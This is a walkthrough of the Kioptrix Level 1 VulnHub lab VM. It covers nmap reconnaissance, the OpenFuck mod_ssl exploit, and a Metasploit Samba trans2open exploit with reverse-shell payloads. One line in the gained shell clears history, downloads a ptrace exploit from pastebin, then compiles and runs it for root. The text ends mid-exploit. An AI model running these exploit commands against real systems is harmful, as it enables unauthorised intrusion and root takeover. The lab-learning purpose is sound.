---
title: "Vulnhub - Kioptrix Level 1"
date: 2022-05-31T12:23:44+05:30
description: " This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges."
draft: false
hideToc: false
tocPosition: outer
enableToc: true
enableTocContent: false
author: Atom
authorEmoji: ✍️
tags: 
- OpenLuck
- OpenFuck
- Trance2open
- CVE-ID-2002-0082
- CVE-ID-2003-0201
series:
categories:
- VulnHub
- Linux
- CVE 
image: /images/tryhackme/vulnversity/cover.webp
---

## Info Table
<table style="width:70%">
 <thead>
  <tr>
    <th>Title</th>
    <th>Kioptrix - Level 1</th>
  </tr>
</thead>
<tr>
    <td>Category</td>
    <td>VulnHub</td>
    </tr>
  <tr>
    <td>Description</td>
    <td>Learn about active recon, CVE </td>
    </tr>
  </tr>
   <tr>
    <td>Difficulty</td>
    <td>Easy</td>
    </tr>
    <tr>
    <td>Maker</td>
    <td>Kioptrix</td>
    </tr>
</table>

Hi hackers Welcome Back Today we are going to look into  vulnhub box which is Kioptrix-Level-1 , you can download this box using this <a href=[https://www.vulnhub.com/entry/kioptrix-level-1-1,22/](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/) > link </a> 

Open VMware and import .vmx file into it, once you get imported , you can able to find login screen

Before getting started, we need to identify the ip address of vulnhub instance. from now let us consider attacker machine is our machine and target machine is koptrix machine. we can identify target machine ip address by using net discover, 

Net discover is a tool which discover network ip address automatically by searching private ip address of each class.

```bash
netdiscover -r 192.168.132.0/24

Currently scanning: Finished!   |   Screen View: Unique Hosts                                      
                                                                                                    
 10 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 600                                   
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.132.1   00:50:56:c0:00:08      7     420  VMware, Inc.                                     
 192.168.132.2   00:50:56:f7:dd:a3      1      60  VMware, Inc.                                     
 192.168.132.129 00:0c:29:7c:3a:16      1      60  VMware, Inc.                                     
 192.168.132.254 00:50:56:e9:00:db      1      60  VMware, Inc.
```

If we need to get into attacker system the thing we need to know about.

``` 1 st target ip```

``` 2 nd  port ```

``` 3 rd  service version ```

 If the target service has vulnerable we can place our foot into target machine, already we know our target ip, let us find the opened port. 

 

```bash
─[atom@atom-vmwarevirtualplatform]─[~/Documents/vulnhub/kioptrix1]                                                                                                      [9/9]
└──_ $nmap -p0-65535 192.168.132.129 > aps.nmap
┌─[atom@atom-vmwarevirtualplatform]─[~/Documents/vulnhub/kioptrix1]                                                                                                           
└──_ $cat aps.nmap                                                                                                                                                            
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-26 07:34 IST                                                                                                               
Nmap scan report for 192.168.132.129                                                                                                                                          
Host is up (0.0037s latency).                                                                                                                                                 
Not shown: 65530 closed tcp ports (conn-refused)                                                                                                                              
PORT      STATE SERVICE                                                                                                                                                       
22/tcp    open  ssh                                                                                                                                                           
80/tcp    open  http
111/tcp   open  rpcbind
139/tcp   open  netbios-ssn
443/tcp   open  https
32768/tcp open  filenet-tms

Nmap done: 1 IP address (1 host up) scanned in 16.46 seconds
```

Let us run service version scan on the opened ports.

```bash
┌─[_]─[atom@atom-vmwarevirtualplatform]─[~/Documents/vulnhub/kioptrix1]
└──_ $nmap -sV -p 22,80,111,139,443,32768 192.168.132.129 > svs.nmap
┌─[atom@atom-vmwarevirtualplatform]─[~/Documents/vulnhub/kioptrix1]
└──_ $cat svs.nmap 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-26 07:36 IST
Nmap scan report for 192.168.132.129
Host is up (0.0011s latency).

PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
111/tcp   open  rpcbind     2 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
32768/tcp open  status      1 (RPC #100024)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.44 seconds
```

Start attack on every vulnerable service 

```bash
└──╼ $nmap -sC 192.168.132.129 > dss.txt
┌─[atom@atom-vmwarevirtualplatform]─[~/Documents/vulnhub/kioptrix1]
└──╼ $cat dss.txt 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-25 21:23 IST
Nmap scan report for 192.168.132.129
Host is up (0.0034s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
| ssh-hostkey: 
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
|_sshv1: Server supports SSHv1
80/tcp    open  http
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
| http-methods: 
|_  Potentially risky methods: TRACE
111/tcp   open  rpcbind
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1          32768/tcp   status
|_  100024  1          32770/udp   status
139/tcp   open  netbios-ssn
443/tcp   open  https
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-09-26T09:32:06
|_Not valid after:  2010-09-26T09:32:06
|_ssl-date: 2022-05-25T15:55:59+00:00; +1m49s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|_    SSL2_RC2_128_CBC_WITH_MD5
|_http-title: 400 Bad Request
32768/tcp open  status

Host script results:
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: 1m48s
|_smb2-time: Protocol negotiation failed (SMB2)

Nmap done: 1 IP address (1 host up) scanned in 27.95 seconds
┌─[atom@atom-vmwarevirtualplatform]─[~/Documents/vulnhub/kioptrix1]
└──╼ $
```
## Port 22
Start with port 22

```bash
└──╼ $ssh root@192.168.132.129 
Unable to negotiate with 192.168.132.129 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1

```

When i try to connect it says no matching method found, and it lists two algorithms, lets select any one algorithm and connect using the algorithm.

```bash
┌─[atom@atom-vmwarevirtualplatform]─[~/Desktop]
└──╼ $ssh  root@192.168.132.129 -oKexAlgorithms=+diffie-hellman-group-exchange-sha1
Unable to negotiate with 192.168.132.129 port 22: no matching cipher found. Their offer: aes128-cbc,3des-cbc,blowfish-cbc,cast128-cbc,arcfour,aes192-cbc,aes256-cbc,rijndael128-cbc,rijndael192-cbc,rijndael256-cbc,rijndael-cbc@lysator.liu.se
```

Again we found  no matching cipher found. we connect using any cypher which listed 

```bash
┌─[✗]─[atom@atom-vmwarevirtualplatform]─[~/Desktop]
└──╼ $ssh  root@192.168.132.129 -oKexAlgorithms=+diffie-hellman-group-exchange-sha1 -c aes128-cbc
The authenticity of host '192.168.132.129 (192.168.132.129)' can't be established.
RSA key fingerprint is SHA256:VDo/h/SG4A6H+WPH3LsQqw1jwjyseGYq9nLeRWPCY/A.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
```

We can see that it asks password of the root account.  i have brute-forced password  but  couldn’t able to crack 

## Port 80,443

```bash
┌─[atom@atom-vmwarevirtualplatform]─[~/Desktop]
└──╼ $nmap -sV -p 80,443 192.168.132.129
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-29 21:15 IST
Nmap scan report for 192.168.132.129
Host is up (0.00085s latency).

PORT    STATE SERVICE   VERSION
80/tcp  open  http      Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
443/tcp open  ssl/https Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.57 seconds
```

We can able to see the apache version. lets run ```nmap vuln scan``` which helps to find CVE if the target service is vulnerable 

```bash
┌─[atom@atom-vmwarevirtualplatform]─[~/Desktop]
└──╼ $nmap -p 80,443 -sV --script vulners 192.168.132.129
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-29 21:14 IST
Nmap scan report for 192.168.132.129
Host is up (0.00083s latency).

PORT    STATE SERVICE   VERSION
80/tcp  open  http      Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
| vulners: 
|   cpe:/a:apache:http_server:1.3.20: 
|     	MSF:ILITIES/LINUXRPM-RHSA-2010-0602/	10.0	https://vulners.com/metasploit/MSF:ILITIES/LINUXRPM-RHSA-2010-0602/	*EXPLOIT*
|     	SSV:72403	7.8	https://vulners.com/seebug/SSV:72403	*EXPLOIT*
|     	SSV:26043	7.8	https://vulners.com/seebug/SSV:26043	*EXPLOIT*
|     	SSV:20899	7.8	https://vulners.com/seebug/SSV:20899	*EXPLOIT*
|     	PACKETSTORM:126851	7.8	https://vulners.com/packetstorm/PACKETSTORM:126851	*EXPLOIT*
|     	PACKETSTORM:123527	7.8	https://vulners.com/packetstorm/PACKETSTORM:123527	*EXPLOIT*
|     	PACKETSTORM:122962	7.8	https://vulners.com/packetstorm/PACKETSTORM:122962	*EXPLOIT*
|     	MSF:AUXILIARY/DOS/HTTP/APACHE_RANGE_DOS	7.8	https://vulners.com/metasploit/MSF:AUXILIARY/DOS/HTTP/APACHE_RANGE_DOS	*EXPLOIT*
|     	EXPLOITPACK:186B5FCF5C57B52642E62C06BABC6F83	7.8	https://vulners.com/exploitpack/EXPLOITPACK:186B5FCF5C57B52642E62C06BABC6F83	*EXPLOIT*
... 
...
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
443/tcp open  ssl/https Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.43 seconds
```

### Manual Method

We can see that there is a tons of exploit available, but we can see that there is no critical CVE. we got version from target system, now a days all exploits available on git hub We can  refer GitHub weather any exploits available for this version 

{{< img src="/images/vulnhub/kioptrix1/2.png" alt="image alt" width="1000px" position="center" >}}

```bash
┌─[atom@atom-vmwarevirtualplatform]─[~/Documents/vulnhub]
└──╼ $git clone https://github.com/heltonWernik/OpenFuck.git
Cloning into 'OpenFuck'...
remote: Enumerating objects: 26, done.
remote: Total 26 (delta 0), reused 0 (delta 0), pack-reused 26
Receiving objects: 100% (26/26), 14.14 KiB | 761.00 KiB/s, done.
Resolving deltas: 100% (6/6), done.
┌─[atom@atom-vmwarevirtualplatform]─[~/Documents/vulnhub]
└──╼ $sudo apt-get install libssl-dev
[sudo] password for atom: 
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
libssl-dev is already the newest version (1.1.1n-0+deb11u2).
0 upgraded, 0 newly installed, 0 to remove and 61 not upgraded

─[✗]─[atom@atom-vmwarevirtualplatform]─[~/Documents/vulnhub/kioptrix1/OpenFuck]
└──╼ $gcc -o open OpenFuck.c -lcrypto
┌─[atom@atom-vmwarevirtualplatform]─[~/Documents/vulnhub/kioptrix1/OpenFuck]
└──╼ $chmod +x open
```

We have to find the ```offset``` value for target machine, we know our target machine is ```Red Hat machine``` , we can identify by booting logs and we already know the apache server version of target machine is ```apache 1.3.20```  if we run our payload we can see that different types of  ```offset``` based on different platform and OS 

```bash
┌─[atom@atom-vmwarevirtualplatform]─[~/Documents/vulnhub/kioptrix1/OpenFuck]
└──╼ $./open 

*******************************************************************
* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

: Usage: ./open target box [port] [-c N]

  target - supported box eg: 0x00
  box - hostname or IP address
  port - port for ssl connection
  -c open N connections. (use range 40-50 if u dont know)
  

  Supported OffSet:
	0x00 - Caldera OpenLinux (apache-1.3.26)
	0x01 - Cobalt Sun 6.0 (apache-1.3.12)
	0x02 - Cobalt Sun 6.0 (apache-1.3.20)
	0x03 - Cobalt Sun x (apache-1.3.26)
	0x04 - Cobalt Sun x Fixed2 (apache-1.3.26)
	0x05 - Conectiva 4 (apache-1.3.6)
	0x06 - Conectiva 4.1 (apache-1.3.9)
	0x07 - Conectiva 6 (apache-1.3.14)
	0x08 - Conectiva 7 (apache-1.3.12)
	0x09 - Conectiva 7 (apache-1.3.19)
	0x0a - Conectiva 7/8 (apache-1.3.26)
	0x0b - Conectiva 8 (apache-1.3.22)
	0x0c - Debian GNU Linux 2.2 Potato (apache_1.3.9-14.1)
  ...
	0x62 - RedHat Linux 7.0-7.1 update (apache-1.3.22-5.7.1)
	0x63 - RedHat Linux 7.0-Update (apache-1.3.27-1.7.1)
	0x64 - RedHat Linux 7.1 (apache-1.3.19-5)1
	0x65 - RedHat Linux 7.1 (apache-1.3.19-5)2
	0x66 - RedHat Linux 7.1-7.0 update (apache-1.3.22-5.7.1)
	0x67 - RedHat Linux 7.1-Update (1.3.22-5.7.1)
	0x68 - RedHat Linux 7.1 (apache-1.3.22-src)
	0x69 - RedHat Linux 7.1-Update (1.3.27-1.7.1)
	0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1
	0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2
	0x6c - RedHat Linux 7.2-Update (apache-1.3.22-6)
	0x6d - RedHat Linux 7.2 (apache-1.3.24)
	0x6e - RedHat Linux 7.2 (apache-1.3.26)
  ...

Fuck to all guys who like use lamah ddos. Read SRC to have no surprise
┌─[✗]─[atom@atom-vmwarevirtualplatform]─[~/Documents/vulnhub/kioptrix1/OpenFuck]
```

```bash
 
┌─[atom@atom-vmwarevirtualplatform]─[~/Documents/vulnhub/kioptrix1/OpenFuck]
└──╼ $./open 0x6b 192.168.132.129 -c 40

*******************************************************************
* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

Connection... 40 of 40
Establishing SSL connection
cipher: 0x4043808c   ciphers: 0x80f8068
Ready to send shellcode
Spawning shell...
bash: no job control in this shell
bash-2.05$ 
bash-2.05$ unset HISTFILE; cd /tmp; wget https://pastebin.com/raw/C7v25Xr9 -O ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; 
--23:15:45--  https://pastebin.com/raw/C7v25Xr9
           => `ptrace-kmod.c'
Connecting to pastebin.com:443... connected!
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/plain]

    0K ...                                                    @   2.59 KB/s

23:15:49 (2.59 KB/s) - `ptrace-kmod.c' saved [4026]

ptrace-kmod.c:183:1: warning: no newline at end of file
[+] Attached to 1055
[+] Waiting for signal
[+] Signal caught
[+] Shellcode placed at 0x4001189d
[+] Now wait for suid shell...
whoami
root
hostname
kioptrix.level1
```

We have used ```./open 0x6b 192.168.132.129 -c 40```  0x6b because if we look into <a href=https://github.com/heltonWernik/OpenLuck/blob/master/OpenFuck.c > CVE **2002-0082** </a> for Red Hat Linux apache  



## Port 111
Lets we look into next port 111


```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-26 07:36 IST
Nmap scan report for 192.168.132.129
Host is up (0.0011s latency).

PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
111/tcp   open  rpcbind     2 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
32768/tcp open  status      1 (RPC #100024)
```

We can see that port 111 is an RPC 

What is RPC ?

<a href="https://www.youtube.com/watch?v=QmhTjsOOrlw&t=684s"> Remote Procedure Call (RPC) </a>is a protocol that one program can use to request a service from a program located in another computer on a network without having to understand the network’s details. RPC helps to communicate processes resides on different systems connected over network

I have tried some basic  enumeration  

```bash
┌─[✗]─[atom@atom-vmwarevirtualplatform]─[~/Documents/vulnhub/kioptrix1]
└──╼ $nmap -Pn --script rpcinfo.nse 192.168.132.129 -p 111
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-30 22:51 IST
Nmap scan report for 192.168.132.129
Host is up (0.00068s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1          32768/tcp   status
|_  100024  1          32768/udp   status

Nmap done: 1 IP address (1 host up) scanned in 0.26 seconds
```

rpcinfo makes an RPC call to an RPC server and reports what it finds.

```bash
┌─[✗]─[atom@atom-vmwarevirtualplatform]─[~/Documents/vulnhub/kioptrix1]
└──╼ $rpcinfo -p 192.168.132.129
   program vers proto   port  service
    100000    2   tcp    111  portmapper
    100000    2   udp    111  portmapper
    100024    1   udp  32768  status
    100024    1   tcp  32768  status
```

rpcclient - tool for executing client side MS-RPC functions

```bash

┌─[✗]─[atom@atom-vmwarevirtualplatform]─[~/Documents/vulnhub/kioptrix1]
└──╼ $rpcclient --user="" --command=enumprivs -N 192.168.134.129
Cannot connect to server.  Error was NT_STATUS_IO_TIMEOUT
```

looking for NFS share 

```bash
┌─[✗]─[atom@atom-vmwarevirtualplatform]─[~/Documents/vulnhub/kioptrix1]
└──╼ $showmount -e 192.168.132.129
clnt_create: RPC: Program not registered
```

nothing makes  me interest on port 111 lets we move to next port. 

## Port 139 - SMB

**NetBIOS** stands for *Network Basic Input Output System*. It is a software protocol that allows applications, PCs, and Desktops on a local area network (LAN) to communicate with network hardware and to transmit data across the network. Software applications that run on a NetBIOS network locate and identify each other via their NetBIOS names. A NetBIOS name is up to 16 characters long and usually, separate from the computer name. Two applications start a NetBIOS session when one (the client) sends a command to “call” another client (the server) over **TCP Port 139**.

```bash
─[atom@atom-vmwarevirtualplatform]─[~/Desktop]
└──╼ $nmap -sC -p 139,445 -sV 192.168.132.129
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-31 10:30 IST
Nmap scan report for 192.168.132.129
Host is up (0.00092s latency).

PORT    STATE  SERVICE      VERSION
139/tcp open   netbios-ssn  Samba smbd (workgroup: MYGROUP)
445/tcp closed microsoft-ds

Host script results:
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.14 seconds
```

From the result we will came to know about on port 139 samba used but still we don't know about its version

```bash
┌─[atom@atom-vmwarevirtualplatform]─[~/Desktop]
└──╼ $nmap -p 139 -sV --script vulners 192.168.132.129
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-31 10:33 IST
Nmap scan report for 192.168.132.129
Host is up (0.00095s latency).

PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd (workgroup: MYGROUP)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.41 seconds
```

let’s we use Metasploit scanner to find version 

```bash
┌─[atom@atom-vmwarevirtualplatform]─[~/Desktop]
└──╼ $msfconsole 
                                                  
 _                                                    _
/ \    /\         __                         _   __  /_/ __
| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \
| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|
|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_
      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\

       =[ metasploit v6.1.39-dev                          ]
+ -- --=[ 2214 exploits - 1171 auxiliary - 396 post       ]
+ -- --=[ 616 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: When in a module, use back to go 
back to the top level prompt

[msf](Jobs:0 Agents:0) >> search smb_version

Matching Modules
================

   #  Name                               Disclosure Date  Rank    Check  Description
   -  ----                               ---------------  ----    -----  -----------
   0  auxiliary/scanner/smb/smb_version                   normal  No     SMB Version Detection

Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/smb/smb_version

[msf](Jobs:0 Agents:0) >> use 0
[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_version) >> set RHOST 192.168.132.129
RHOST => 192.168.132.129
[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_version) >> run

[*] 192.168.132.129:139   - SMB Detected (versions:) (preferred dialect:) (signatures:optional)
[*] 192.168.132.129:139   -   Host could not be identified: Unix (Samba 2.2.1a)
[*] 192.168.132.129:      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_version) >>
```

finally we came to know that  version info ```Samba 2.2.1a```.  search on google any public exploit available.  

{{< img src="/images/vulnhub/kioptrix1/3.png" alt="image alt" width="1000px" position="center" >}}

```bash
[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_version) >> use exploit/linux/samba/trans2open
[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp

[msf](Jobs:0 Agents:0) exploit(linux/samba/trans2open) >> set RHOST 192.168.132.129
RHOST => 192.168.132.129

[msf](Jobs:0 Agents:0) exploit(linux/samba/trans2open) >> show options 

Module options (exploit/linux/samba/trans2open):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  192.168.132.129      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT   139                  yes       The target port (TCP)

Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.132.128  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Samba 2.2.x - Bruteforce

[msf](Jobs:0 Agents:0) exploit(linux/samba/trans2open) >> run

[msf](Jobs:0 Agents:0) exploit(linux/samba/trans2open) >> exploit

[*] Started reverse TCP handler on 192.168.132.128:4444 
[*] 192.168.132.129:139 - Trying return address 0xbffffdfc...
[*] 192.168.132.129:139 - Trying return address 0xbffffcfc...
[*] 192.168.132.129:139 - Trying return address 0xbffffbfc...
[*] 192.168.132.129:139 - Trying return address 0xbffffafc...
[*] Sending stage (989032 bytes) to 192.168.132.129
[*] 192.168.132.129 - Meterpreter session 1 closed.  Reason: Died
[-] Meterpreter session 1 is not valid and will be closed
[*] 192.168.132.129:139 - Trying return address 0xbffff9fc...
[*] Sending stage (989032 bytes) to 192.168.132.129
[*] 192.168.132.129 - Meterpreter session 2 closed.  Reason: Died
[*] 192.168.132.129:139 - Trying return address 0xbffff8fc...
[*] Sending stage (989032 bytes) to 192.168.132.129
[*] 192.168.132.129 - Meterpreter session 3 closed.  Reason: Died
[-] Meterpreter session 3 is not valid and will be closed
[*] 192.168.132.129:139 - Trying return address 0xbffff7fc...
[*] Sending stage (989032 bytes) to 192.168.132.129
[*] 192.168.132.129 - Meterpreter session 4 closed.  Reason: Died

```

we can see that the exploit ware not executed successfully . if we look into the payload, we used staged payload ```linux/x86/meterpreter/reverse_tcp```  some times exploit will not work because of payloads, let's try to change payload to ```Non-Staged ``` payload 

```bash
[msf](Jobs:0 Agents:0) exploit(linux/samba/trans2open) >> show payloads

Compatible Payloads
===================

   #   Name                                              Disclosure Date  Rank    Check  Description
   -   ----                                              ---------------  ----    -----  -----------
   0   payload/generic/custom                                             normal  No     Custom Payload
   1   payload/generic/debug_trap                                         normal  No     Generic x86 Debug Trap
   2   payload/generic/shell_bind_tcp                                     normal  No     Generic Command Shell, Bind TCP Inline
   3   payload/generic/shell_reverse_tcp                                  normal  No     Generic Command Shell, Reverse TCP Inline
   4   payload/generic/ssh/interact                                       normal  No     Interact with Established SSH Connection
   5   payload/generic/tight_loop                                         normal  No     Generic x86 Tight Loop
   6   payload/linux/x86/adduser                                          normal  No     Linux Add User
   7   payload/linux/x86/chmod                                            normal  No     Linux Chmod
   8   payload/linux/x86/exec                                             normal  No     Linux Execute Command
   9   payload/linux/x86/meterpreter/bind_ipv6_tcp                        normal  No     Linux Mettle x86, Bind IPv6 TCP Stager (Linux x86)
   10  payload/linux/x86/meterpreter/bind_ipv6_tcp_uuid                   normal  No     Linux Mettle x86, Bind IPv6 TCP Stager with UUID Support (Linux x86)
   11  payload/linux/x86/meterpreter/bind_nonx_tcp                        normal  No     Linux Mettle x86, Bind TCP Stager
   12  payload/linux/x86/meterpreter/bind_tcp                             normal  No     Linux Mettle x86, Bind TCP Stager (Linux x86)
   13  payload/linux/x86/meterpreter/bind_tcp_uuid                        normal  No     Linux Mettle x86, Bind TCP Stager with UUID Support (Linux x86)
   14  payload/linux/x86/meterpreter/reverse_ipv6_tcp                     normal  No     Linux Mettle x86, Reverse TCP Stager (IPv6)
   15  payload/linux/x86/meterpreter/reverse_nonx_tcp                     normal  No     Linux Mettle x86, Reverse TCP Stager
   16  payload/linux/x86/meterpreter/reverse_tcp                          normal  No     Linux Mettle x86, Reverse TCP Stager
   17  payload/linux/x86/meterpreter/reverse_tcp_uuid                     normal  No     Linux Mettle x86, Reverse TCP Stager
   18  payload/linux/x86/metsvc_bind_tcp                                  normal  No     Linux Meterpreter Service, Bind TCP
   19  payload/linux/x86/metsvc_reverse_tcp                               normal  No     Linux Meterpreter Service, Reverse TCP Inline
   20  payload/linux/x86/read_file                                        normal  No     Linux Read File
   21  payload/linux/x86/shell/bind_ipv6_tcp                              normal  No     Linux Command Shell, Bind IPv6 TCP Stager (Linux x86)
   22  payload/linux/x86/shell/bind_ipv6_tcp_uuid                         normal  No     Linux Command Shell, Bind IPv6 TCP Stager with UUID Support (Linux x86)
   23  payload/linux/x86/shell/bind_nonx_tcp                              normal  No     Linux Command Shell, Bind TCP Stager
   24  payload/linux/x86/shell/bind_tcp                                   normal  No     Linux Command Shell, Bind TCP Stager (Linux x86)
   25  payload/linux/x86/shell/bind_tcp_uuid                              normal  No     Linux Command Shell, Bind TCP Stager with UUID Support (Linux x86)
   26  payload/linux/x86/shell/reverse_ipv6_tcp                           normal  No     Linux Command Shell, Reverse TCP Stager (IPv6)
   27  payload/linux/x86/shell/reverse_nonx_tcp                           normal  No     Linux Command Shell, Reverse TCP Stager
   28  payload/linux/x86/shell/reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Stager
   29  payload/linux/x86/shell/reverse_tcp_uuid                           normal  No     Linux Command Shell, Reverse TCP Stager
   30  payload/linux/x86/shell_bind_ipv6_tcp                              normal  No     Linux Command Shell, Bind TCP Inline (IPv6)
   31  payload/linux/x86/shell_bind_tcp                                   normal  No     Linux Command Shell, Bind TCP Inline
   32  payload/linux/x86/shell_bind_tcp_random_port                       normal  No     Linux Command Shell, Bind TCP Random Port Inline
   33  payload/linux/x86/shell_reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Inline
   34  payload/linux/x86/shell_reverse_tcp_ipv6                           normal  No     Linux Command Shell, Reverse TCP Inline (IPv6)
```

previously we used ```No 16``` payload, we are going to changer payload to ```No 33``` ```payload/linux/x86/shell_reverse_tcp```

```bash
[msf](Jobs:0 Agents:0) exploit(linux/samba/trans2open) >> set payload payload/linux/x86/shell_reverse_tcp
payload => linux/x86/shell_reverse_tcp
[msf](Jobs:0 Agents:0) exploit(linux/samba/trans2open) >> exploit

[*] Started reverse TCP handler on 192.168.132.128:4444 
[*] 192.168.132.129:139 - Trying return address 0xbffffdfc...
[*] 192.168.132.129:139 - Trying return address 0xbffffcfc...
[*] 192.168.132.129:139 - Trying return address 0xbffffbfc...
[*] 192.168.132.129:139 - Trying return address 0xbffffafc...
[*] 192.168.132.129:139 - Trying return address 0xbffff9fc...
[*] 192.168.132.129:139 - Trying return address 0xbffff8fc...
[*] 192.168.132.129:139 - Trying return address 0xbffff7fc...
[*] 192.168.132.129:139 - Trying return address 0xbffff6fc...
